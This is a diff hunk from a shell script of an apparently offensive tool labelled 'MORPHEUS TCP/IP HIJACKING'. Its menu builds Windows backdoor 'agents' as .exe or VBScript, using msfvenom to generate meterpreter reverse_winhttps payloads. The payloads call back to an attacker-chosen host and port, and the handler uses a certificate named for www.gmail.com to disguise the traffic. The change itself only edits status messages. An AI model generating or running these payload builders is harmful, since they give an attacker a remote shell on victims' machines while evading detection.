@@ -2821,11 +2821,11 @@ fi
 #
 form=$(zenity --list --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text "\nAvailable agents:" --radiolist --column "Pick" --column "Option" TRUE "Build binary.exe agent" FALSE "Build VBScript agent" FALSE "Build powershell agent" --width 320 --height 230) > /dev/null 2>&1
 if [ "$form" = "Build binary.exe agent" ]; then
-  echo ${BlueF}[☠]${white} Building rc4 agent.exe ..${Reset};
+  echo ${BlueF}[☠]${white} Building winhttps agent.exe ..${Reset};
   sleep 2
   xterm -T "MORPHEUS - BUILD AGENT.exe" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true -f exe -n 20 -o $IPATH/output/agent.exe"
 elif [ "$form" = "Build VBScript agent" ]; then
-  echo ${BlueF}[☠]${white} Building rc4 agent.vbs ..${Reset};
+  echo ${BlueF}[☠]${white} Building winhttps agent.vbs ..${Reset};
   sleep 2
   xterm -T "MORPHEUS - BUILD AGENT.vbs" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 -o $IPATH/output/chars.raw"
   disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
